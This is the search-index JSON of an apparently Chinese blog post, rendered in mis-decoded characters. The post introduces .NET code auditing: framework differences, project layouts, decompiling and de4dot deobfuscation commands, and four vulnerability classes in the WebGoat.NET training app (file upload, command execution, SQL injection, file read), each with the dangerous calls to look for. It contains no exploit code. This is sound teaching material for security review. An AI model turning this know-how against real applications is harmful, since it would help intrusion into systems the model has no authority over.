[{"categories":["ä»£ç å®¡è®¡"],"content":"dotnetä»£ç å®¡è®¡ç³»åˆ—(ä¸€)","date":"2024-08-30","objectID":"/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/","tags":["ä»£ç å®¡è®¡"],"title":"dotnetä»£ç å®¡è®¡ç³»åˆ—(ä¸€)","uri":"/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/"},{"categories":["ä»£ç å®¡è®¡"],"content":"dotnetä»£ç å®¡è®¡ç³»åˆ—(ä¸€) 1. æ¦‚è¿° ","date":"2024-08-30","objectID":"/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/:0:0","tags":["ä»£ç å®¡è®¡"],"title":"dotnetä»£ç å®¡è®¡ç³»åˆ—(ä¸€)","uri":"/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/"},{"categories":["ä»£ç å®¡è®¡"],"content":"1.1. èƒŒæ™¯ .NET Framework æ˜¯å¾®è½¯å¼€å‘çš„ä¸€ä¸ªæ‰˜ç®¡ä»£ç æ¡†æ¶ï¼Œä¸»è¦ç”¨äºæ„å»ºå’Œè¿è¡Œ Windows åº”ç”¨ç¨‹åºã€‚å®ƒæä¾›äº†å¤§é‡çš„ç±»åº“ã€é€šç”¨è¯­è¨€è¿è¡Œæ—¶ï¼ˆCLRï¼‰ã€ä»¥åŠå¼€å‘å’Œç®¡ç†åº”ç”¨ç¨‹åºçš„å·¥å…·ã€‚ä½¿ç”¨ .NET Framework å¼€å‘çš„åº”ç”¨ç¨‹åºé€šå¸¸æ˜¯ç”¨ C#ã€VB.NETã€F# ç­‰è¯­è¨€ç¼–å†™çš„ï¼Œç¼–è¯‘åç”Ÿæˆä¸­é—´è¯­è¨€ï¼ˆILï¼‰ï¼Œç„¶åç”± CLR æ‰§è¡Œã€‚ .NET Framework çš„é‡è¦ç‰¹æ€§åŒ…æ‹¬ï¼š è·¨è¯­è¨€äº’æ“ä½œæ€§ï¼šä¸åŒç¼–ç¨‹è¯­è¨€ç¼–å†™çš„ç»„ä»¶å¯ä»¥æ— ç¼åä½œï¼Œå› ä¸ºå®ƒä»¬éƒ½ç¼–è¯‘ä¸º IL å¹¶åœ¨ CLR ä¸­è¿è¡Œã€‚ å†…å­˜ç®¡ç†ï¼šé€šè¿‡åƒåœ¾æ”¶é›†å™¨è‡ªåŠ¨ç®¡ç†å†…å­˜ï¼Œå‡å°‘å†…å­˜æ³„æ¼å’Œå…¶ä»–å†…å­˜ç›¸å…³çš„å®‰å…¨é—®é¢˜ã€‚ å®‰å…¨æ¨¡å‹ï¼š.NET Framework æä¾›äº†ä»£ç è®¿é—®å®‰å…¨ï¼ˆCASï¼‰å’ŒéªŒè¯æœºåˆ¶ï¼Œæ§åˆ¶ä»£ç çš„æƒé™å’Œæ‰§è¡Œã€‚ åœ¨ä¼ä¸šåº”ç”¨ä¸­ï¼Œ.NET Framework å¹¿æ³›åº”ç”¨äºå¼€å‘ Web åº”ç”¨ç¨‹åºã€æ¡Œé¢åº”ç”¨ç¨‹åºå’ŒæœåŠ¡ã€‚åœ¨ä»Šå¹´å›½å®¶HWä¸­ï¼Œä»æœ‰å¤§é‡åº”ç”¨é‡‡ç”¨ .NETæ¡†æ¶ã€‚ç”±äºå…¶å¹¿æ³›ä½¿ç”¨ä»¥åŠåº”ç”¨ç¨‹åºçš„å¤æ‚æ€§ï¼Œ.NET åº”ç”¨ç¨‹åºå®¹æ˜“æˆä¸ºæ”»å‡»è€…çš„ç›®æ ‡ã€‚ç›®å‰å¸‚é¢ä¸Šé’ˆå¯¹ .NETæ¡†æ¶ä»£ç å®¡è®¡çš„èµ„æ–™è¾ƒå°‘ï¼Œé‚æ€»ç»“æœ¬æ–‡ã€‚ ","date":"2024-08-30","objectID":"/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/:1:0","tags":["ä»£ç å®¡è®¡"],"title":"dotnetä»£ç å®¡è®¡ç³»åˆ—(ä¸€)","uri":"/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/"},{"categories":["ä»£ç å®¡è®¡"],"content":"1.2. .NET Frameworkä¸.NET Coreçš„åŒºåˆ« .NET å’Œ .NET Core æ˜¯å¾®è½¯å¼€å‘çš„ä¸¤ä¸ªä¸åŒçš„å¼€å‘æ¡†æ¶ï¼Œæœ‰å¦‚ä¸‹åŒºåˆ«ï¼š ","date":"2024-08-30","objectID":"/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/:2:0","tags":["ä»£ç å®¡è®¡"],"title":"dotnetä»£ç å®¡è®¡ç³»åˆ—(ä¸€)","uri":"/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/"},{"categories":["ä»£ç å®¡è®¡"],"content":"å¹³å°æ”¯æŒ .NET Framework (.NET): ä»…æ”¯æŒåœ¨ Windows æ“ä½œç³»ç»Ÿä¸Šè¿è¡Œã€‚é€‚åˆå¼€å‘ Windows æ¡Œé¢åº”ç”¨ç¨‹åºã€ASP.NET Web åº”ç”¨ç¨‹åºç­‰ã€‚ .NET Core: æ˜¯è·¨å¹³å°çš„æ¡†æ¶ï¼Œå¯ä»¥åœ¨ Windowsã€Linux å’Œ macOS ä¸Šè¿è¡Œã€‚å› æ­¤ï¼Œå®ƒæ›´é€‚åˆéœ€è¦è·¨å¹³å°éƒ¨ç½²çš„åº”ç”¨ç¨‹åºã€‚ ","date":"2024-08-30","objectID":"/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/:2:1","tags":["ä»£ç å®¡è®¡"],"title":"dotnetä»£ç å®¡è®¡ç³»åˆ—(ä¸€)","uri":"/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/"},{"categories":["ä»£ç å®¡è®¡"],"content":"å¼€æºä¸ç¤¾åŒºæ”¯æŒ .NET Framework: ä¸æ˜¯å®Œå…¨å¼€æºçš„ï¼Œè™½ç„¶å®ƒçš„ä¸€äº›ç»„ä»¶æ˜¯å¼€æºçš„ï¼Œä½†æ•´ä½“æ¡†æ¶ä»ç„¶æ˜¯ç”±å¾®è½¯ç»´æŠ¤å’Œæ§åˆ¶çš„ã€‚ .NET Core: æ˜¯å®Œå…¨å¼€æºçš„ï¼Œå¹¶ä¸”æœ‰ä¸€ä¸ªæ´»è·ƒçš„å¼€æºç¤¾åŒºã€‚å¼€å‘è€…å¯ä»¥è®¿é—®æºä»£ç ï¼Œå¹¶å¯¹å…¶è¿›è¡Œè´¡çŒ®ã€‚ æ€»ä¹‹ï¼Œ.NET Core æ˜¯ä¸€ä¸ªæ›´ç°ä»£åŒ–ã€è·¨å¹³å°ã€æ¨¡å—åŒ–çš„æ¡†æ¶ï¼Œæ›´é€‚åˆç°ä»£åº”ç”¨çš„å¼€å‘éœ€æ±‚ã€‚è€Œ .NET Framework åˆ™ä¸»è¦ç”¨äºç°æœ‰ Windows åº”ç”¨çš„ç»´æŠ¤å’Œå»¶ç»­å¼€å‘ã€‚éšç€ .NET 5+ çš„å‘å¸ƒï¼Œå¾®è½¯å°† .NET Core ä½œä¸ºæœªæ¥çš„ä¸»çº¿å¼€å‘æ–¹å‘ï¼Œå¹¶ç»Ÿä¸€äº†æ•´ä¸ª .NET ç”Ÿæ€ç³»ç»Ÿã€‚ 2. .NET Web é¡¹ç›® ç›®å‰ï¼ŒASP.NETä¸­ä¸‰ç§ä¸»æµçš„å¼€å‘æ–¹å¼æ˜¯ï¼šASP.NET Webformã€ASP.NET MVCã€ASP.NET Coreã€‚ æ‹¿ä¸€å¼ å®˜æ–¹å›¾ç‰‡æ¥æè¿°ï¼š ","date":"2024-08-30","objectID":"/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/:2:2","tags":["ä»£ç å®¡è®¡"],"title":"dotnetä»£ç å®¡è®¡ç³»åˆ—(ä¸€)","uri":"/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/"},{"categories":["ä»£ç å®¡è®¡"],"content":"2.1. WebFormå¼€å‘æ¨¡å¼ ä¸€å¼ ç»å…¸çš„å›¾æ¥æè¿°æ•´ä¸ªè¿‡ç¨‹ï¼š aspxé¡µé¢æ˜¾ç¤ºï¼Œé€šå¸¸ä»£ç æ˜¯ä¸€äº›htmlä»£ç ï¼Œç¬¬ä¸€è¡Œæ–‡ä»¶å¤´ä¼šæ˜¾ç¤ºå…·ä½“è§¦å‘åŠŸèƒ½ä»£ç çš„ä½ç½®ï¼Œå°±å¯ä»¥é€šè¿‡è¿™ä¸ªä½ç½®æ‰¾åˆ°å¤„ç†çš„å‡½æ•°ã€‚æœåŠ¡å™¨ç«¯çš„åŠ¨ä½œå°±æ˜¯åœ¨aspx.csæ–‡ä»¶ä¸­å®šä¹‰ .csæ˜¯ç±»æ–‡ä»¶ï¼Œå­˜æ”¾å…¬å…±ç±»ã€‚ .ashxæ˜¯ä¸€èˆ¬å¤„ç†ç¨‹åºï¼Œä¸»è¦ç”¨äºå†™web handlerï¼Œå¯ä»¥ç†è§£æˆä¸ä¼šæ˜¾ç¤ºçš„aspxé¡µé¢ï¼Œä¸è¿‡æ•ˆç‡æ›´é«˜ dllå°±æ˜¯ç¼–è¯‘ä¹‹åçš„csæ–‡ä»¶ã€‚ ä»¥WebGoat.NETé¶åœºä¸ºä¾‹ï¼š ç¬¬ä¸€è¡Œçš„å«ä¹‰ï¼š Languageï¼šè¡¨ç¤ºå½“å‰æ‰€ä½¿ç”¨çš„è¯­è¨€ï¼Œä¸ºC# å¼€å‘è¯­è¨€ã€‚ AutoEventWireupï¼šè¡¨ç¤º ASP.NET æ˜¯å¦è‡ªåŠ¨å°†é¡µé¢äº‹ä»¶ï¼ˆå¦‚ Page_Loadï¼‰ç»‘å®šåˆ°é¡µé¢çš„äº‹ä»¶å¤„ç†æ–¹æ³•ï¼Œtrue è¡¨ç¤ºè‡ªåŠ¨ç»‘å®šï¼Œè¿™æ„å‘³ç€å¦‚æœé¡µé¢ä¸­æœ‰ä¸€ä¸ªåä¸º Page_Load çš„æ–¹æ³•ï¼Œå®ƒå°†è‡ªåŠ¨å¤„ç†é¡µé¢çš„ Load äº‹ä»¶ã€‚ CodeBehindï¼š å±æ€§æŒ‡å®šä¸é¡µé¢å…³è”çš„ä»£ç éšè—æ–‡ä»¶çš„è·¯å¾„ã€‚åœ¨ä¸Šå›¾ä¸­ï¼ŒLoginPage.aspx.cs æ˜¯åŒ…å«åå°ä»£ç çš„æ–‡ä»¶ï¼Œå…¶ä¸­å®šä¹‰äº†é¡µé¢çš„é€»è¾‘ã€‚åœ¨ä¸€äº›è¾ƒæ–°çš„ ASP.NET é¡¹ç›®ä¸­ï¼ŒCodeBehind å¯èƒ½è¢« CodeFile æ›¿ä»£ï¼Œç‰¹åˆ«æ˜¯åœ¨ Web Application é¡¹ç›®ä¸­ã€‚ Inheritsï¼šæŒ‡å®šé¡µé¢ç»§æ‰¿çš„ç±»ã€‚è¯¥é¡µé¢ç»§æ‰¿è‡ª OWASP.WebGoat.NET.LoginPage ç±»ï¼Œè¿™ä¸ªç±»é€šå¸¸åœ¨ LoginPage.aspx.cs æ–‡ä»¶ä¸­å®šä¹‰ã€‚ ç›®å½•ç»“æ„ï¼š App_Code: å­˜æ”¾å…±äº«çš„ä»£ç æ–‡ä»¶ï¼Œå¦‚ç±»ã€æ¥å£ç­‰ã€‚è¿™äº›æ–‡ä»¶å¯ä»¥åœ¨æ•´ä¸ªåº”ç”¨ç¨‹åºä¸­è®¿é—®ã€‚ App_Data: å­˜å‚¨åº”ç”¨ç¨‹åºçš„æ•°æ®åº“æ–‡ä»¶æˆ–å…¶ä»–æ•°æ®æ–‡ä»¶ã€‚è¿™ä¸ªç›®å½•å¯¹å¤–éƒ¨ç”¨æˆ·ä¸å¯è®¿é—®ã€‚ Bin: å­˜æ”¾ç¼–è¯‘åçš„ç¨‹åºé›†ï¼ˆDLL æ–‡ä»¶ï¼‰å’Œä¾èµ–é¡¹ã€‚è¿™ä¸ªç›®å½•ä¼šè‡ªåŠ¨åˆ›å»ºã€‚ Resources: å­˜æ”¾ä¸ç‰¹å®šé¡µé¢ç›¸å…³çš„èµ„æºæ–‡ä»¶ã€‚ Web.config: åº”ç”¨ç¨‹åºçš„é…ç½®æ–‡ä»¶ï¼Œç”¨äºå®šä¹‰åº”ç”¨ç¨‹åºçš„è®¾ç½®ã€è¿æ¥å­—ç¬¦ä¸²ã€è·¯ç”±ç­‰ã€‚ ","date":"2024-08-30","objectID":"/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/:3:0","tags":["ä»£ç å®¡è®¡"],"title":"dotnetä»£ç å®¡è®¡ç³»åˆ—(ä¸€)","uri":"/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/"},{"categories":["ä»£ç å®¡è®¡"],"content":"2.2. MVC å¼€å‘æ¨¡å¼ ASP.NET MVC æ˜¯ä¸€ç§åŸºäº MVC æ¨¡å¼çš„ Web å¼€å‘æ¡†æ¶ï¼Œæ³¨é‡åˆ†ç¦»å…³æ³¨ç‚¹ï¼ˆSeparation of Concernsï¼‰ï¼Œå³å°†ä¸šåŠ¡é€»è¾‘ã€ç”¨æˆ·ç•Œé¢å’Œè¾“å…¥æ§åˆ¶åˆ†ç¦»ã€‚å…·ä½“å‘ˆç°æ¨¡å¼å’ŒJavaæ¯”è¾ƒç±»ä¼¼ï¼Œåœ¨æ­¤ä¸åšèµ˜è¿°ã€‚ ç›®å½•ç»“æ„ï¼š Controllers: åŒ…å«æ§åˆ¶å™¨ç±»æ–‡ä»¶ã€‚æ§åˆ¶å™¨è´Ÿè´£å¤„ç†ç”¨æˆ·è¾“å…¥ã€æ“ä½œæ¨¡å‹ï¼Œå¹¶è¿”å›è§†å›¾ã€‚ Models: å­˜æ”¾åº”ç”¨ç¨‹åºçš„æ¨¡å‹ç±»ï¼Œè¿™äº›ç±»å®šä¹‰äº†åº”ç”¨ç¨‹åºçš„æ•°æ®ç»“æ„å’Œä¸šåŠ¡é€»è¾‘ã€‚ Views: åŒ…å«è§†å›¾æ–‡ä»¶ï¼ˆ.cshtml æˆ– .vbhtmlï¼‰ï¼Œç”¨äºå‘ˆç°ç”¨æˆ·ç•Œé¢ã€‚é€šå¸¸æ¯ä¸ªæ§åˆ¶å™¨æœ‰ä¸€ä¸ªå¯¹åº”çš„è§†å›¾æ–‡ä»¶å¤¹ã€‚ Scripts: å­˜æ”¾ JavaScript æ–‡ä»¶ã€‚ App_Start: åŒ…å«å¯åŠ¨é…ç½®æ–‡ä»¶ï¼Œå¦‚ RouteConfig.csã€BundleConfig.csã€FilterConfig.cs ç­‰ã€‚ App_Data: å­˜å‚¨åº”ç”¨ç¨‹åºçš„æ•°æ®åº“æ–‡ä»¶æˆ–å…¶ä»–æ•°æ®æ–‡ä»¶ã€‚ Bin: å­˜æ”¾ç¼–è¯‘åçš„ç¨‹åºé›†ï¼ˆDLL æ–‡ä»¶ï¼‰å’Œä¾èµ–é¡¹ã€‚ Global.asax: åº”ç”¨ç¨‹åºçš„å…¨å±€é…ç½®æ–‡ä»¶ï¼Œç”¨äºå¤„ç†åº”ç”¨ç¨‹åºçº§åˆ«çš„äº‹ä»¶ã€‚ Web.config: åº”ç”¨ç¨‹åºçš„é…ç½®æ–‡ä»¶ã€‚ ","date":"2024-08-30","objectID":"/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/:4:0","tags":["ä»£ç å®¡è®¡"],"title":"dotnetä»£ç å®¡è®¡ç³»åˆ—(ä¸€)","uri":"/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/"},{"categories":["ä»£ç å®¡è®¡"],"content":"ASP.NET Core Razor Pages ASP.NET Core æ˜¯ä¸€ä¸ªè·¨å¹³å°ã€é«˜æ€§èƒ½çš„å¼€æºæ¡†æ¶ï¼Œç”¨äºæ„å»ºç°ä»£ Web åº”ç”¨ã€äº‘åº”ç”¨å’Œå¾®æœåŠ¡ã€‚å®ƒæ•´åˆäº† ASP.NET MVC å’Œ Web APIï¼Œå¹¶å…·æœ‰æ›´å¥½çš„æ€§èƒ½å’Œçµæ´»æ€§ã€‚é€šè¿‡ Razor Pages æä¾›äº†ä¸€ç§ç±»ä¼¼ Web Forms çš„å¼€å‘ä½“éªŒï¼Œä½†æ›´è½»é‡ã€‚æ¯ä¸ªé¡µé¢ç”±ä¸€ä¸ª Razor æ–‡ä»¶ï¼ˆ.cshtmlï¼‰å’Œä¸€ä¸ªä»£ç éšè—æ–‡ä»¶ï¼ˆ.cshtml.csï¼‰ç»„æˆï¼Œé¡µé¢é€»è¾‘ä¸è§†å›¾ç´§å¯†ç»“åˆã€‚é¿å…äº† MVC ä¸­çš„è·¯ç”±é…ç½®å¤æ‚æ€§ï¼Œé€‚åˆé¡µé¢æ•°é‡å°‘çš„åº”ç”¨ï¼Œé€‚ç”¨äºå°å‹é¡¹ç›®æˆ–å•é¡µé¢åº”ç”¨ç¨‹åºï¼Œä»¥åŠå¸Œæœ›ç®€åŒ–é¡µé¢å¼€å‘çš„åœºæ™¯ã€‚ ç›®å½•ç»“æ„ï¼š Controllers: åŒ…å«æ§åˆ¶å™¨ç±»æ–‡ä»¶ã€‚æ§åˆ¶å™¨å¤„ç†è¯·æ±‚å¹¶è¿”å›å“åº”ï¼Œé€šå¸¸ä½¿ç”¨ API é£æ ¼æˆ– MVC æ¨¡å¼ã€‚ Models: åŒ…å«æ¨¡å‹ç±»ï¼Œç”¨äºå®šä¹‰åº”ç”¨ç¨‹åºçš„æ•°æ®ç»“æ„å’Œä¸šåŠ¡é€»è¾‘ã€‚ Views: åŒ…å«è§†å›¾æ–‡ä»¶ï¼ˆ.cshtmlï¼‰ï¼Œç”¨äºå‘ˆç°ç”¨æˆ·ç•Œé¢ã€‚ Shared: åŒ…å«å…±äº«çš„è§†å›¾ï¼Œå¦‚å¸ƒå±€æ–‡ä»¶ _Layout.cshtmlã€‚ Pages: ç”¨äº Razor Pages é¡¹ç›®ï¼ŒåŒ…å«é¡µé¢æ–‡ä»¶ï¼ˆ.cshtmlï¼‰å’Œé¡µé¢æ¨¡å‹æ–‡ä»¶ï¼ˆ.cshtml.csï¼‰ã€‚ wwwroot: å­˜æ”¾é™æ€æ–‡ä»¶ï¼ˆCSSã€JavaScriptã€å›¾åƒç­‰ï¼‰ã€‚è¿™ä¸ªæ–‡ä»¶å¤¹ä¸­çš„å†…å®¹å¯ä»¥é€šè¿‡ URL ç›´æ¥è®¿é—®ã€‚ css: å­˜æ”¾ CSS æ–‡ä»¶ã€‚ js: å­˜æ”¾ JavaScript æ–‡ä»¶ã€‚ lib: å­˜æ”¾é€šè¿‡åŒ…ç®¡ç†å™¨ï¼ˆå¦‚ npm æˆ– LibManï¼‰å®‰è£…çš„å‰ç«¯åº“ã€‚ AppSettings.json: åº”ç”¨ç¨‹åºçš„é…ç½®æ–‡ä»¶ï¼Œæ›¿ä»£äº†ä¼ ç»Ÿçš„ Web.configã€‚ Program.cs: åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ï¼Œé…ç½®å’Œå¯åŠ¨åº”ç”¨ç¨‹åºã€‚ Startup.cs: é…ç½®åº”ç”¨ç¨‹åºçš„æœåŠ¡å’Œè¯·æ±‚ç®¡é“ã€‚é€šå¸¸åŒ…æ‹¬ä¸­é—´ä»¶é…ç½®å’ŒæœåŠ¡ä¾èµ–æ³¨å…¥ã€‚ Bin: å­˜æ”¾ç¼–è¯‘åçš„ç¨‹åºé›†ï¼ˆDLL æ–‡ä»¶ï¼‰å’Œä¾èµ–é¡¹ã€‚ Properties: åŒ…å«é¡¹ç›®çš„å±æ€§æ–‡ä»¶ï¼Œå¦‚ launchSettings.jsonï¼Œç”¨äºé…ç½®å¼€å‘å’Œå‘å¸ƒè®¾ç½®ã€‚ 3. åç¼–è¯‘å·¥å…· åœ¨ .NET åº”ç”¨ç¨‹åºå¼€å‘ä¸­ï¼Œé¢„ç¼–è¯‘ï¼ˆPrecompilationï¼‰æ˜¯æŒ‡å°†åº”ç”¨ç¨‹åºçš„ä»£ç æå‰ç¼–è¯‘æˆDLLç­‰åº“æ–‡ä»¶ï¼Œä»¥æé«˜æ€§èƒ½ã€å‡å°‘é¦–æ¬¡è¯·æ±‚çš„å¯åŠ¨æ—¶é—´ï¼Œå¹¶å¢å¼ºä»£ç çš„ä¿æŠ¤æ€§ã€‚é¢„ç¼–è¯‘é€šå¸¸åº”ç”¨äº Web åº”ç”¨ç¨‹åºï¼Œå¦‚ ASP.NETï¼Œè¿™ç±»åº”ç”¨ç¨‹åºçš„ä»£ç åœ¨éƒ¨ç½²åˆ°æœåŠ¡å™¨ä¹‹å‰å¯ä»¥é€šè¿‡é¢„ç¼–è¯‘å‡å°‘æˆ–æ¶ˆé™¤è¿è¡Œæ—¶ç¼–è¯‘çš„éœ€æ±‚ã€‚ å½“ç«™ç‚¹å­˜åœ¨è¿™ç§æƒ…å†µæ—¶ï¼Œå°±éœ€è¦åç¼–è¯‘ /bin ç›®å½•ä¸‹çš„ DLL æ–‡ä»¶ï¼Œæ¥è·å–æºç ã€‚ å¯é€‰æ‹©çš„ .NETåç¼–è¯‘å·¥å…·ä¸»è¦æœ‰å››ä¸ªï¼šdnSpyï¼ˆäº2020å¹´å·¦å³åœæ­¢æ›´æ–°ï¼‰ã€ILSpyã€dotPeekï¼ˆJetBrainså‘å¸ƒï¼‰ã€dnSpyxï¼ˆéå®˜æ–¹æ›´æ–°ç‰ˆï¼‰ã€‚ ä¸‹å›¾æ˜¯ ILSpy åç¼–è¯‘çš„ç»“æœï¼š ILSpyå¯¹å­—ç¬¦ä¸²æœç´¢åŠŸèƒ½ä¸æ˜¯å¾ˆå‹å¥½ï¼Œå› æ­¤å¯ä»¥é€‰æ‹©å°†åç¼–è¯‘çš„æºç å¯¼å‡ºä¸ºæ–‡æœ¬ï¼Œå†å»å®¡è®¡ã€‚ å¦‚æœåç¼–è¯‘å‡ºçš„ä»£ç å­˜åœ¨æ··æ·†ï¼Œåˆ™å¯åˆ©ç”¨åæ··æ·†å·¥å…·è¿›è¡Œè¿˜åŸã€‚åæ··æ·†çš„å·¥å…·æœ‰å¾ˆå¤šï¼Œå…¶ä¸­de4dotæ˜¯ç›®å‰æœ€ä¸»æµçš„åæ··æ·†å·¥å…·ã€‚ æ£€æµ‹æ··æ·†å™¨ç±»å‹ï¼š de4dot.exe -d C:\\bin\\demo.dll æ‰¹é‡åæ··æ·†ï¼š de4dot.exe -r c:\\input -ru -ro c:\\output 4. å¸¸è§æ¼æ´ ä»¥ä¸‹æ¼æ´ä»£ç å‡ä»¥WebGoat.NETé¶åœºä¸ºä¾‹ ","date":"2024-08-30","objectID":"/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/:5:0","tags":["ä»£ç å®¡è®¡"],"title":"dotnetä»£ç å®¡è®¡ç³»åˆ—(ä¸€)","uri":"/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/"},{"categories":["ä»£ç å®¡è®¡"],"content":"4.1. æ–‡ä»¶ä¸Šä¼ æ¼æ´ /WebGoat/Content/UploadPathManipulation.aspx.cs ä»£ç çš„ä¸»è¦ç›®çš„æ˜¯å°†ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜åˆ°æœåŠ¡å™¨ä¸Šçš„ä¸€ä¸ªæŒ‡å®šç›®å½•ä¸­ï¼Œå¹¶åœ¨ä¸Šä¼ æˆåŠŸæˆ–å¤±è´¥æ—¶å‘ç”¨æˆ·æ˜¾ç¤ºç›¸åº”çš„æ¶ˆæ¯ã€‚ å…·ä½“ä»£ç é€»è¾‘å¦‚ä¸‹ï¼š é¡µé¢åŠ è½½ï¼š Page_Load æ–¹æ³•ä¸ºç©ºï¼Œæ²¡æœ‰è¿›è¡Œä»»ä½•æ“ä½œã€‚é¡µé¢åŠ è½½æ—¶ï¼Œæ²¡æœ‰ç‰¹å®šçš„é€»è¾‘æ‰§è¡Œã€‚ æ–‡ä»¶ä¸Šä¼ ï¼š btnUpload_Click æ–¹æ³•æ˜¯æŒ‰é’®ç‚¹å‡»äº‹ä»¶çš„å¤„ç†ç¨‹åºï¼Œå½“ç”¨æˆ·ç‚¹å‡»ä¸Šä¼ æŒ‰é’®æ—¶è§¦å‘ã€‚ é¦–å…ˆï¼Œä»£ç æ£€æŸ¥ FileUpload1 æ§ä»¶æ˜¯å¦åŒ…å«æ–‡ä»¶ï¼ˆå³ FileUpload1.HasFile æ˜¯å¦ä¸ºçœŸï¼‰ã€‚ å¦‚æœæœ‰æ–‡ä»¶ä¸Šä¼ ï¼Œä»£ç è·å–æ–‡ä»¶çš„åç§°ï¼Œå¹¶ä½¿ç”¨ Server.MapPath å°†è™šæ‹Ÿè·¯å¾„è½¬æ¢ä¸ºæœåŠ¡å™¨ä¸Šçš„ç‰©ç†è·¯å¾„ã€‚ç„¶åè°ƒç”¨ FileUpload1.SaveAs å°†æ–‡ä»¶ä¿å­˜åˆ°æŒ‡å®šçš„è·¯å¾„ä¸­ã€‚ å¦‚æœæ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼Œç¨‹åºä¼šåœ¨ labelUpload æ ‡ç­¾ä¸­æ˜¾ç¤ºæˆåŠŸæ¶ˆæ¯ã€‚ å¦‚æœä¸Šä¼ è¿‡ç¨‹ä¸­å‘ç”Ÿå¼‚å¸¸ï¼Œå¼‚å¸¸ä¿¡æ¯å°†æ˜¾ç¤ºåœ¨ labelUpload æ ‡ç­¾ä¸­ã€‚ æœ€åï¼Œç¡®ä¿ labelUpload æ ‡ç­¾å¯è§ã€‚ å…¸å‹æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼ŒæœªéªŒè¯æ–‡ä»¶æ ¼å¼ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä¸Šä¼ .aspxæ–‡ä»¶ã€‚ å‰ç«¯ä»£ç å¦‚ä¸‹ /WebGoat/Content/UploadPathManipulation.aspxï¼š ä»£ç å®¡è®¡å…³æ³¨ç‚¹ï¼š saveas() File.Move(sourcePath, destinationPath); File.Copy(sourcePath, destinationPath); System.IO.File.WriteAllBytes ","date":"2024-08-30","objectID":"/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/:6:0","tags":["ä»£ç å®¡è®¡"],"title":"dotnetä»£ç å®¡è®¡ç³»åˆ—(ä¸€)","uri":"/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/"},{"categories":["ä»£ç å®¡è®¡"],"content":"4.2. RCE æ¼æ´ /WebGoat/App_Code/Util.cs å¦‚æœ cmd å‚æ•°å¯æ§æ—¶ï¼Œå¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ ä»£ç å®¡è®¡å…³æ³¨ç‚¹ï¼š Process.Start() ShellExecute() ","date":"2024-08-30","objectID":"/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/:7:0","tags":["ä»£ç å®¡è®¡"],"title":"dotnetä»£ç å®¡è®¡ç³»åˆ—(ä¸€)","uri":"/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/"},{"categories":["ä»£ç å®¡è®¡"],"content":"4.3. SQL æ³¨å…¥æ¼æ´ /WebGoat/Content/SQLInjection.aspx.cs è·Ÿè¿› GetEmailByName æ–¹æ³• é‡‡å–å‚æ•°æ‹¼æ¥çš„æ–¹å¼ï¼Œå¯¼è‡´SQLæ³¨å…¥ã€‚ ä»£ç å®¡è®¡å…³æ³¨ç‚¹ï¼š SQLè¯­å¥æ‹¼æ¥å¤„ ","date":"2024-08-30","objectID":"/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/:8:0","tags":["ä»£ç å®¡è®¡"],"title":"dotnetä»£ç å®¡è®¡ç³»åˆ—(ä¸€)","uri":"/2024/08/dotnet%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B8%80/"},{"categories":["ä»£ç å®¡è®¡"],"content":"4.4. ä»»æ„æ–‡ä»¶è¯»å–/ä¸‹è½½ /WebGoat/Content/PathManipulation.aspx.cs 